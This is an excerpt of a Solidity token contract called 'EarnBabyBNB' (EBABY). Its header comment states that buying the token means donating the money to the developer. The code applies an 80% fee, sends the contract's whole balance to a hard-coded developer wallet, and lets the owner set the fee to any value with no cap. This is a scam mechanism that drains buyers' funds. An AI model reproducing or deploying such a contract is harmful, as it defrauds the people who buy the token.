...
/**
    ...
    Buying from this token means you agree to donate the money to dev. If you did not read contract and still aped in,
    that means you agree to give money to dev. Fuck bots and all
...
contract EarnBabyBNB is Context, IERC20, Ownable {
    ...
    uint256 private _tshibalympicTotal;

    string private _name = "EarnBabyBNB";
    string private _symbol = "EBABY";
    ...
    uint256 public _shibalympicFee = 80;
    uint256 private _previousshibalympicFee = _shibalympicFee;
    
    uint256 public _maxTxAmount = 1000 * 10**9 * 10**9;
    uint256 private minimumTokensBeforeSwap = 1 * 10**9 * 10**9; 
    
    address payable public shibalympicWallet = 0x00bc2aa1281BBBd3B9Af8A39b69eB39d0F6AE501; 
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        _tshibalympicTotal = _tshibalympicTotal.add(address(this).balance);
        TransferCharityETH(shibalympicWallet, address(this).balance);
    }
    ...
    function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_shibalympicFee).div(
            10**2
        );
    }
    
    function removeAllFee() private {
        if(_taxFee == 0 && _burnFee == 0 && _shibalympicFee == 0) return;
        
        _previousTaxFee = _taxFee;
        _previousBurnFee = _burnFee;
        _previousshibalympicFee = _shibalympicFee;
    ...
    function restoreAllFee() private {
        ...
        _shibalympicFee = _previousshibalympicFee;
    }
    ...
    function setshibalympicFeePercent(uint256 shibalympicFee) external onlyOwner() {
        _shibalympicFee = shibalympicFee;
    }
